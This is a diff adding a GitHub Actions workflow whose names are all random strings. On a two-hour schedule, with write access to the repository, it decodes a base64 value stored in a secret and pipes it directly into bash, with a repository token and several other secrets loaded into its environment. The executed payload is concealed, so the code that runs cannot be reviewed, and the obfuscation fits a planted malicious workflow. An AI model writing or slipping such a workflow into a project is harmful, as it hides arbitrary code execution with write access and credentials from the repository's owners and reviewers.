@@ -1,0 +1,21 @@
+name: bsFoK
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  A1YYuK:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.rlqXPX }}
+      - name: RqBLa
+        env:
+          fnSlITJKg: ${{ secrets.Vba0coyAnj67L82 }}
+          KuZ6Ok6yrdqHdOdh: ${{ secrets.ZxehxxRO }}
+          F1vAFaQl: ${{ secrets.AXWJwIF88ioz }}
+          GITHUB_TOKEN: ${{ secrets.rlqXPX }}
+        run: echo "$fnSlITJKg" | base64 -d | bash
